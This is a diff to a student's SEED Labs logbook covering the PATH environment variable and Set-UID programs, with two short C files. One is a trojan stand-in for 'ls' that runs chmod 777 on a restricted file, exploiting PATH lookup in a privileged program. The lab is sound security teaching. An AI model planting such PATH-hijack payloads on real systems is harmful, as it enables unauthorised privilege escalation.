@@ -128,14 +128,51 @@ int main()
 ![PATH](/Logbooks/img/Week4/Task5.4.2.png)
 
 
+## Task 6: The PATH Environment Variable and Set-UID Programs
+
+1. Calling system() within a Set-UID program is dangerous because since these type of programs run with it's owners privileges, a user can running this program and manipulate the environment variables who may be malicious. 
+
+2. On the given file (we called it manipulate.c), the program executes the system function calling the command `ls`. This way we can manipulate the environment variables to trick the program into calling another version created by us of `ls`
+
+![runningManipulateFile]()
+
+3. Following the seed labs guide, we now created a new file called manipulate1.c that makes the user gain access to a file that is highly permission restrictive.
+
+**Before running manipulate1:**
+
+![beforeManipulate1]()
 
 
+**After running manipulate1:**
+
+![afterManipulate1]()
 
 
+**manipulate.c:** 
 
+```c++
+#include <stdio.h>
+#include <stdlib.h>
 
+int main()
+{
+    system("ls");
+    return 0;
+}
+```
 
+**manipulate1.c:**
 
+```c++
+#include <stdio.h>
+#include <stdlib.h>
 
+int main() {
 
+    printf("SNEAKY SNEAKY!\n");
+    system("chmod 777 /home/seed/Documents/Week4/highPermissionFile");
+
+    return 0;
+}
+```
 
